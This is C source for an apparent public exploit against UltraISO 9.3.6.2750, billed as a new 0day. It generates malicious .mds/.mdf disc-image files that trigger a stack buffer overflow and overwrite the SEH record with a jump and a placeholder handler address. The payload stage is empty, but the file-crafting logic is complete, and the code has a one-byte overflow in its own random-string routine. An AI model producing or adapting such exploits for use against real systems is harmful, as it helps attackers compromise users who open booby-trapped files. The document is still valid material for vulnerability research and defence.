/*
   DISCLAIMER
    
   THIS PROGRAM IS NOT INTENDED TO BE USED ON OTHER COMPUTERS AND IT IS DESTINED FOR PERSONAL RESEARCH ONLY!!!!
   The programs are provided as is without any guarantees or warranty.
   The author is not responsible for any damage or losses of any kind caused by the use or misuse of the programs.
   The author is under no obligation to provide support, service, corrections, or upgrades to the free software programs.
    
   Author:           fl0 fl0w
   Software:         UltraISO 
   Dl link:          http://www.ezbsystems.com/ultraiso/download.htm
    
   Afected Versions: 9.3.6.2750
   Remote:           Yes
   Local:            Yes
   Class:            Boundary Condition Error
   Bug:              Stack buffer overflow
   Exploitable:      Yes 
   Afected software: Windows 7/2008/Vista/2003/XP (32bit and 64bit), Windows 2000, ME, 98SE, 98, or Windows NT4.0 SP6a 
   Fix:              No fix   
   Compiler:         gcc version 3.4.4 (cygming special, gdc 0.12, using dmd 0.125) 
   Advice:           To avoid any problems under Windows use cygwin console.
                     
   The .C code:
 */
#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>

#define TITLE "-UltraISO .mds .mdf files buffer overflow exploit(new 0day)\n" \
              "-Author fl0 fl0w\n"
#define VER   "-Version 9.3.6.2750"
#define CHAR_SIZE 1
#define Write_mod "wb" 
#define MDS_FILE_NAME "20100622_123031.mds"
#define MDF_FILE_NAME "20100622_123031.mdf"
#define CHARS		    "0123456789ABCDEFGHIJKLMNOPQRST" \
                        "UVWXYZabcdefghijklmnopqrstuvwxyz"
#define MEM_ALOC(tip,n) (tip*)malloc(sizeof(tip)*n)		
#define RND_STR_OFFSET 480				
#define RND_STR_SIZE 5000
#define MDS_FILE           "\x4d\x45\x44\x49\x41\x20\x44\x45\x53\x43\x52\x49\x50\x54\x4f\x52\x01\x03\x00\x00" \
		                   "\x01\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x58\x00\x00\x00\x00\x00\x00\x00\x6a\xff\xff\xff\x19\x00\x00\x00\x01\x00\x04\x03" \
						   "\x01\x00\x01\x00\x00\x00\x00\x00\x70\x00\x00\x00\x00\x00\x14\x00\xa0\x00\x00\x00" \
						   "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
                           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
					       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\xa1\x00\x00\x00" \
						   "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\xa2\x00\x00\x00" \
						   "\x00\x00\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa\x00\x14\x00\x01\x00\x00\x00" \
					       "\x00\x00\x02\x00\xc8\x01\x00\x00\x30\x09\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x01\x00\x00\x00\xd0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x96\x00\x00\x00" \
						   "\x19\x00\x00\x00\xe0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
#define MDS_END			   "\x2a\x2e\x6d\x64\x66\x00"
#define SEH_HANDLER 944
#define NEXT_SEH    940
#define MDF_FILE  "\x66\x61\x6B\x65\x20\x6D\x64\x66\x20\x66\x69\x6C\x65\x20"
        typedef int i32;
        typedef char i8;
        typedef short i16;
    void error_handle();
	void gen_random (i8*, const int);
	void create_file(i8*,i8*);
	void copy_str(i8*,i8*,i32);
    i32 main(){
	   printf("%s%s",TITLE,VER);
	   create_file(MDS_FILE_NAME,MDF_FILE_NAME);
	   return 0;
	}
	void create_file(i8* Mdsname,i8* Mdfname){
	FILE* f=fopen(Mdsname,Write_mod);
	FILE* g=fopen(Mdfname,Write_mod);
	i8* buff=MEM_ALOC(i8,sizeof(MDS_FILE)+RND_STR_SIZE);
	i8* rnd_str_buff=MEM_ALOC(i8,RND_STR_SIZE);
	
	if(!buff)
	   error_handle();
	
	if(!rnd_str_buff)
	   error_handle();
	   
	gen_random(rnd_str_buff,RND_STR_SIZE);
	copy_str(buff,MDS_FILE,sizeof(MDS_FILE));
	copy_str(buff+RND_STR_OFFSET,rnd_str_buff,RND_STR_SIZE);
	copy_str(buff+NEXT_SEH,"\xeb\x04\x90\x90",4);
	copy_str(buff+SEH_HANDLER,"\x66\x66\x66\x66",4);
	
	if(!f) 
	  error_handle();
	
    fwrite(buff,CHAR_SIZE,sizeof(MDS_FILE)+RND_STR_SIZE,f); 
    fwrite(MDS_END,CHAR_SIZE,sizeof(MDS_END)-1,f); 	
	
	free(buff);
	free(rnd_str_buff);
	fclose(f);
	
	if(!g)
	   error_handle();
	   
	fwrite(MDF_FILE,CHAR_SIZE,sizeof(MDF_FILE)-1,g);   
	fclose(g);
	}
    void error_handle(void){
                   perror("\nError");
                   exit(1);
    }
	void gen_random (i8* s, const int len){ 
	    i32 i;
        for(i=0;i<len;++i){
        s[i]=CHARS[rand()%(sizeof(CHARS)-1)];
        }
       s[len]=0;
    }
    void copy_str(i8* v,i8* w,i32 len){
                   memcpy(v,w,len);
    }
